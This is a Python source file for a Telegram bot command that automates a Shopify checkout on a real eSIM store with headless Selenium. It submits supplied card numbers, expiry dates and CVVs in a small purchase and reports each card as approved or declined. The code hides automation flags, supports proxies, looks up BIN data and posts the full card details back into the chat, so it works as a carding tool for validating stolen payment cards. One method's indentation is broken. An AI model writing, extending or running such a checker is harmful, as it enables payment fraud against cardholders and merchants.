from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import random
import time
import logging
import re
from telegram import Update
from telegram.ext import ContextTypes

from card_parser import parse_card_input
from security import is_allowed_chat, get_chat_permissions, can_use_command
from api_client import api_client

logger = logging.getLogger(__name__)

class Shopify1CheckoutAutomation:
    def __init__(self, headless=True, proxy_url=None):
        self.driver = None
        self.wait = None
        self.headless = headless
        self.proxy_url = proxy_url
    
    def setup_driver(self):
        """Inizializza il driver selenium"""
        try:
            chrome_options = Options()
            
            if self.headless:
                chrome_options.add_argument("--headless")
            
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            
            if self.proxy_url:
                chrome_options.add_argument(f'--proxy-server={self.proxy_url}')
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            self.wait = WebDriverWait(self.driver, 15)
            logger.info("✅ Driver Shopify $1 inizializzato")
            return True
        except Exception as e:
            logger.error(f"❌ Errore inizializzazione driver: {e}")
            return False

    def close_popup(self):
        """Chiude popup"""
        try:
            self.driver.execute_script("""
                // Rimuovi tutti i popup possibili
                var popups = document.querySelectorAll('#shopify-pc__banner, .popup, .modal, [class*="popup"], [class*="modal"]');
                popups.forEach(function(popup) {
                    popup.remove();
                });
                
                // Rimuovi overlay
                var overlays = document.querySelectorAll('.overlay, [class*="overlay"]');
                overlays.forEach(function(overlay) {
                    overlay.remove();
                });
            """)
            print("✅ Popup rimossi")
            return True
        except Exception as e:
            print(f"⚠️ Nessun popup: {e}")
            return False

    def generate_italian_info(self):
        """Genera informazioni italiane"""
        return {
            'first_name': 'Mario',
            'last_name': 'Rossi',
            'email': f"test{random.randint(1000,9999)}@gmail.com",
            'phone': f"3{random.randint(10,99)}{random.randint(1000000,9999999)}",
            'address': 'Via Roma 123',
            'city': 'Milano',
            'postal_code': '20100',
            'name_on_card': 'TEST CARD'
        }
    
    def add_to_cart(self):
        """Aggiunge prodotto al carrello"""
        try:
            print("🛒 Aggiungo prodotto al carrello...")
            self.driver.get("https://earthesim.com/products/usa-esim?variant=42902995271773")
            time.sleep(4)
            
            self.close_popup()
            time.sleep(1)
            
            # Prova diversi selettori per il bottone Add to Cart
            add_button_selectors = [
                "button[type='submit']",
                "button[name='add']",
                ".product-form__submit",
                ".btn--add-to-cart",
                "input[type='submit']",
                "form[action='/cart/add'] button",
                ".add-to-cart",
                "[data-add-to-cart]"
            ]
            
            add_button = None
            for selector in add_button_selectors:
                try:
                    add_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if add_button.is_displayed() and add_button.is_enabled():
                        print(f"✅ Trovato bottone: {selector}")
                        break
                    else:
                        add_button = None
                except:
                    continue
            
            if not add_button:
                print("❌ Bottone Add to Cart non trovato")
                return False
            
            self.driver.execute_script("arguments[0].click();", add_button)
            print("✅ Prodotto aggiunto al carrello")
            
            time.sleep(3)
            return True
            
        except Exception as e:
            print(f"❌ Errore aggiunta carrello: {e}")
            return False
    
    def go_to_cart_and_checkout(self):
        """Va al carrello e checkout"""
        try:
            print("🛒 Vado al carrello...")
            self.driver.get("https://earthesim.com/cart")
            time.sleep(4)
            
            self.close_popup()
            time.sleep(1)
            
            # PROVA TUTTI I POSSIBILI BOTTONI CHECKOUT
            checkout_selectors = [
                "button[name='checkout']",
                "button#checkout",
                "a[href*='checkout']",
                "form[action*='checkout'] button",
                "input[value*='Checkout']",
                ".checkout-button",
                ".btn--checkout",
                "[class*='checkout'] button",
                "a[href*='/checkout']",
                ".cart__checkout"
            ]
            
            checkout_button = None
            for selector in checkout_selectors:
                try:
                    checkout_button = self.driver.find_element(By.CSS_SELECTOR, selector)
                    if checkout_button.is_displayed() and checkout_button.is_enabled():
                        print(f"✅ Trovato checkout: {selector}")
                        print(f"   Testo: {checkout_button.text}")
                        break
                    else:
                        checkout_button = None
                except Exception as e:
                    continue
            
            if not checkout_button:
                print("❌ Nessun bottone checkout trovato")
                # Prova a vedere se c'è un link checkout
                try:
                    checkout_links = self.driver.find_elements(By.CSS_SELECTOR, "a[href*='checkout']")
                    for link in checkout_links:
                        if link.is_displayed():
                            print(f"✅ Trovato link checkout: {link.get_attribute('href')}")
                            self.driver.get(link.get_attribute('href'))
                            time.sleep(5)
                            return True
                except:
                    pass
                return False
            
            # Scroll e click
            self.driver.execute_script("arguments[0].scrollIntoView(true);", checkout_button)
            time.sleep(1)
            self.driver.execute_script("arguments[0].click();", checkout_button)
            print("✅ Checkout cliccato")
            
            time.sleep(5)
            return True
                
        except Exception as e:
            print(f"❌ Errore checkout: {e}")
            return False
    
    def fill_shipping_info(self, info):
        """Compila informazioni spedizione"""
        try:
            print("📦 Compilo informazioni spedizione...")
            time.sleep(3)
            
            # Email
            try:
                email_field = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input#email")))
                email_field.clear()
                email_field.send_keys(info['email'])
                print("✅ Email compilata")
            except:
                print("❌ Email non trovata")
            
            # Nome
            try:
                first_name_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField0")
                first_name_field.clear()
                first_name_field.send_keys(info['first_name'])
                print("✅ Nome compilato")
            except:
                print("❌ Nome non trovato")
            
            # Cognome
            try:
                last_name_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField1")
                last_name_field.clear()
                last_name_field.send_keys(info['last_name'])
                print("✅ Cognome compilato")
            except:
                print("❌ Cognome non trovato")
            
            # Indirizzo
            try:
                address_field = self.driver.find_element(By.CSS_SELECTOR, "input#billing-address1")
                address_field.clear()
                address_field.send_keys(info['address'])
                print("✅ Indirizzo compilato")
            except:
                print("❌ Indirizzo non trovato")
            
            # Città
            try:
                city_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField4")
                city_field.clear()
                city_field.send_keys(info['city'])
                print("✅ Città compilata")
            except:
                print("❌ Città non trovata")
            
            # CAP
            try:
                postal_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField3")
                postal_field.clear()
                postal_field.send_keys(info['postal_code'])
                print("✅ CAP compilato")
            except:
                print("❌ CAP non trovato")
            
            # Telefono
            try:
                phone_field = self.driver.find_element(By.CSS_SELECTOR, "input#TextField5")
                phone_field.clear()
                phone_field.send_keys(info['phone'])
                print("✅ Telefono compilato")
            except:
                print("❌ Telefono non trovato")
            
            time.sleep(2)
            return True
            
        except Exception as e:
            print(f"❌ Errore spedizione: {e}")
            return False
    
    def fill_payment_info(self, info, card_data):
        """Compila informazioni pagamento"""
        try:
            print("💳 Compilo informazioni pagamento...")
            time.sleep(2)
            
            # CARD NUMBER
            try:
                card_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-number']")
                self.driver.switch_to.frame(card_iframe)
                card_field = self.driver.find_element(By.CSS_SELECTOR, "input#number")
                card_field.clear()
                card_field.send_keys(card_data['number'])
                self.driver.switch_to.default_content()
                print("✅ Card number compilato")
            except Exception as e:
                print(f"❌ Card number errore: {e}")
                self.driver.switch_to.default_content()
            
            time.sleep(1)
            
            # EXPIRY DATE
            try:
                expiry_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-expiry']")
                self.driver.switch_to.frame(expiry_iframe)
                expiry_field = self.driver.find_element(By.CSS_SELECTOR, "input#expiry")
                expiry_field.clear()
                expiry_value = f"{card_data['month']}/{card_data['year']}"
                expiry_field.send_keys(expiry_value)
                self.driver.switch_to.default_content()
                print("✅ Expiry compilato")
            except Exception as e:
                print(f"❌ Expiry errore: {e}")
                self.driver.switch_to.default_content()
            
            time.sleep(1)
            
            # CVV
            try:
                cvv_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-verification_value']")
                self.driver.switch_to.frame(cvv_iframe)
                cvv_field = self.driver.find_element(By.CSS_SELECTOR, "input#verification_value")
                cvv_field.clear()
                cvv_field.send_keys(card_data['cvv'])
                self.driver.switch_to.default_content()
                print("✅ CVV compilato")
            except Exception as e:
                print(f"❌ CVV errore: {e}")
                self.driver.switch_to.default_content()
            
            time.sleep(1)
            
            # NAME ON CARD
            try:
                name_iframe = self.driver.find_element(By.CSS_SELECTOR, "iframe[name*='card-fields-name']")
                self.driver.switch_to.frame(name_iframe)
                name_field = self.driver.find_element(By.CSS_SELECTOR, "input#name")
                name_field.clear()
                name_field.send_keys(info['name_on_card'])
                self.driver.switch_to.default_content()
                print("✅ Name on card compilato")
            except Exception as e:
                print(f"❌ Name on card errore: {e}")
                self.driver.switch_to.default_content()
            
            time.sleep(2)
            return True
            
        except Exception as e:
            print(f"❌ Errore pagamento: {e}")
            try:
                self.driver.switch_to.default_content()
            except:
                pass
            return False
    
    def complete_purchase(self):
        """Completa acquisto"""
        try:
            print("🚀 Completo acquisto...")
            time.sleep(2)
            
            # Prova diversi selettori per il bottone Pay
            pay_selectors = [
                "button#checkout-pay-button",
                "button[type='submit']",
                "button[name='complete']",
                ".btn--pay",
                "[data-testid='pay-button']"
            ]
            
            pay_button = None
            for selector in pay_selectors:
                try:
                    pay_button = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, selector)))
                    if pay_button.is_displayed() and pay_button.is_enabled():
                        print(f"✅ Trovato pay button: {selector}")
                        break
                    else:
                        pay_button = None
                except:
                    continue
            
            if not pay_button:
                print("❌ Pay button non trovato")
                return False
            
            self.driver.execute_script("arguments[0].click();", pay_button)
            print("✅ Pay Now cliccato")
            
            # Aspetta il risultato
            time.sleep(10)
            return True
                
        except Exception as e:
            print(f"❌ Errore completamento: {e}")
            return False
    
   def analyze_result(self):
    """Analizza risultato - VERSIONE CORRETTA"""
    print("🔍 Analisi risultato Shopify...")
    
    try:
        current_url = self.driver.current_url.lower()
        page_text = self.driver.page_source.lower()
        page_title = self.driver.title.lower()
        
        print(f"📄 URL: {current_url}")
        print(f"📄 Title: {page_title}")
        
        # DEBUG: Stampa parte del testo per debugging
        print(f"🔍 Sample page text: {page_text[:500]}...")
        
        # 1. PRIMA CONTROLLA GLI ERRORI DI CARTA (MOLTO SPECIFICI)
        decline_keywords = [
            'your card was declined',
            'card was declined', 
            'declined',
            'do not honor',
            'insufficient funds',
            'invalid card',
            'transaction not allowed',
            'payment failed',
            'try again',
            'error processing',
            'cannot process',
            'unsuccessful',
            'failed'
        ]
        
        for keyword in decline_keywords:
            if keyword in page_text:
                print(f"❌ DECLINED - Trovato: {keyword}")
                return "DECLINED"
        
        # 2. Controlla elementi visivi di errore
        try:
            error_elements = self.driver.find_elements(By.CSS_SELECTOR, ".error, .field-error, .notice--error, .alert--error, [class*='error']")
            for element in error_elements:
                if element.is_displayed():
                    error_text = element.text.lower()
                    if any(keyword in error_text for keyword in ['card', 'declined', 'failed', 'invalid']):
                        print(f"❌ DECLINED - Elemento errore: {error_text[:100]}")
                        return "DECLINED"
        except:
            pass
        
        # 3. CONTROLLA SE SIAMO ANCORA IN CHECKOUT CON MESSAGGI DI ERRORE
        if 'checkout' in current_url:
            # Controlla se ci sono messaggi di errore visibili nel checkout
            try:
                # Cerca messaggi di errore specifici di Shopify
                shopify_errors = self.driver.find_elements(By.XPATH, "//*[contains(text(), 'declined') or contains(text(), 'error') or contains(text(), 'failed')]")
                for error in shopify_errors:
                    if error.is_displayed():
                        error_text = error.text.lower()
                        if any(word in error_text for word in ['card', 'payment', 'transaction']):
                            print(f"❌ DECLINED - Messaggio Shopify: {error_text[:100]}")
                            return "DECLINED"
            except:
                pass
            
            # Se siamo ancora nel checkout DOPO il tentativo di pagamento, è molto probabilmente declined
            print("❌ DECLINED - Ancora in checkout dopo pagamento")
            return "DECLINED"
        
        # 4. SOLO ORA CONTROLLA I SUCCESSI
        success_keywords = [
            'thank you',
            'order confirmed', 
            'order number',
            'confirmation',
            'success',
            'completed',
            'receipt'
        ]
        
        for keyword in success_keywords:
            if keyword in page_text:
                print(f"✅ APPROVED - Trovato: {keyword}")
                return "APPROVED"
        
        # 5. CONTROLLA URL DI SUCCESSO
        success_urls = ['thank_you', 'thank-you', 'order', 'confirmation']
        if any(url in current_url for url in success_urls):
            print("✅ APPROVED - URL di successo")
            return "APPROVED"
        
        # 6. CONTROLLA ELEMENTI DI SUCCESSO VISIVI
        try:
            success_elements = self.driver.find_elements(By.XPATH, "//*[contains(text(), 'Order') or contains(text(), 'Thank')]")
            for element in success_elements:
                if element.is_displayed() and any(word in element.text.lower() for word in ['confirmed', 'number', 'thank']):
                    print(f"✅ APPROVED - Elemento successo: {element.text[:100]}")
                    return "APPROVED"
        except:
            pass
        
        # 7. SE SIAMO SU UNA PAGINA DIVERSA DA CHECKOUT, CONTROLLA BENE
        if 'earthesim.com' in current_url and 'checkout' not in current_url:
            # Ma controlla che non sia una pagina di errore
            if any(keyword in page_text for keyword in ['error', 'failed', 'try again']):
                print("❌ DECLINED - Pagina diversa ma con errori")
                return "DECLINED"
            else:
                print("✅ APPROVED - Pagina diversa da checkout senza errori")
                return "APPROVED"
        
        # 8. ULTIMO CONTROLLO: CERCA IL MESSAGGIO "YOUR CARD WAS DECLINED" IN TUTTE LE FORME POSSIBILI
        declined_phrases = [
            'your card was declined',
            'your card has been declined', 
            'card declined',
            'payment declined',
            'transaction declined'
        ]
        
        for phrase in declined_phrases:
            if phrase in page_text:
                print(f"❌ DECLINED - Frase specifica: {phrase}")
                return "DECLINED"
        
        # 9. DEFAULT: SE NON SIAMO SICURI, MEGLIO DECLINED CHE FALSI POSITIVI
        print("❌ DECLINED - Nessun indicatore chiaro di successo trovato")
        return "DECLINED"
        
    except Exception as e:
        print(f"💥 Errore analisi: {e}")
        return f"ERROR - {str(e)}"
    
    def process_payment(self, card_data):
        """Processa pagamento"""
        try:
            print("🚀 INIZIO PROCESSO SHOPIFY $1")
            
            if not self.setup_driver():
                return "ERROR_DRIVER_INIT"
            
            test_info = self.generate_italian_info()
            
            if not self.add_to_cart():
                return "ERROR_ADD_TO_CART"
            
            if not self.go_to_cart_and_checkout():
                return "ERROR_CHECKOUT"
            
            if not self.fill_shipping_info(test_info):
                return "ERROR_SHIPPING_INFO"
            
            if not self.fill_payment_info(test_info, card_data):
                return "ERROR_PAYMENT_INFO"
            
            if not self.complete_purchase():
                return "ERROR_COMPLETE_PURCHASE"
            
            result = self.analyze_result()
            return result
            
        except Exception as e:
            print(f"💥 Errore: {e}")
            return f"ERROR - {str(e)}"
        finally:
            if self.driver:
                self.driver.quit()

def process_shopify1_payment(card_number, expiry, cvv, headless=True, proxy_url=None):
    processor = Shopify1CheckoutAutomation(headless=headless, proxy_url=proxy_url)
    card_data = {
        'number': card_number,
        'month': expiry[:2],
        'year': "20" + expiry[2:],
        'cvv': cvv
    }
    return processor.process_payment(card_data)

async def s1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check card with Shopify $1"""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    chat_type = update.effective_chat.type
    
    if not is_allowed_chat(chat_id, chat_type, user_id):
        permission_info = get_chat_permissions(chat_id, chat_type, user_id)
        await update.message.reply_text(f"❌ {permission_info}")
        return
    
    can_use, error_msg = can_use_command(user_id, 's1')
    if not can_use:
        await update.message.reply_text(error_msg)
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /s1 number|month|year|cvv [proxy]")
        return
    
    full_input = ' '.join(context.args)
    proxy_match = re.search(r'(https?://[^\s]+)', full_input)
    proxy_url = proxy_match.group(0) if proxy_match else None
    
    if proxy_url:
        card_input = full_input.replace(proxy_url, '').strip()
    else:
        card_input = full_input
    
    card_input = re.sub(r'\s+', ' ', card_input).strip()
    
    wait_message = await update.message.reply_text("🔄 Checking Shopify $1...")
    
    try:
        parsed_card = parse_card_input(card_input)
        
        if not parsed_card['valid']:
            await wait_message.edit_text(f"❌ Invalid card: {parsed_card['error']}")
            return
        
        bin_number = parsed_card['number'][:6]
        bin_result = api_client.bin_lookup(bin_number)
        
        result = process_shopify1_payment(
            parsed_card['number'],
            parsed_card['month'] + parsed_card['year'][-2:],
            parsed_card['cvv'],
            proxy_url=proxy_url
        )
        
        if "APPROVED" in result:
            status_emoji = "✅"
            title = "Approved"
        elif "DECLINED" in result:
            status_emoji = "❌" 
            title = "Declined"
        else:
            status_emoji = "⚠️"
            title = "Error"
        
        response = f"""{title} {status_emoji}

Card: {parsed_card['number']}|{parsed_card['month']}|{parsed_card['year']}|{parsed_card['cvv']}
Gateway: SHOPIFY $1
Response: {result}"""

        if bin_result and bin_result['success']:
            bin_data = bin_result['data']
            response += f"""

BIN Info:
Country: {bin_data.get('country', 'N/A')}
Issuer: {bin_data.get('issuer', 'N/A')}
Scheme: {bin_data.get('scheme', 'N/A')}
Type: {bin_data.get('type', 'N/A')}
Tier: {bin_data.get('tier', 'N/A')}"""
        
        await wait_message.edit_text(response)
        
    except Exception as e:
        logger.error(f"❌ Error in s1_command: {e}")
        await wait_message.edit_text(f"❌ Error: {str(e)}")
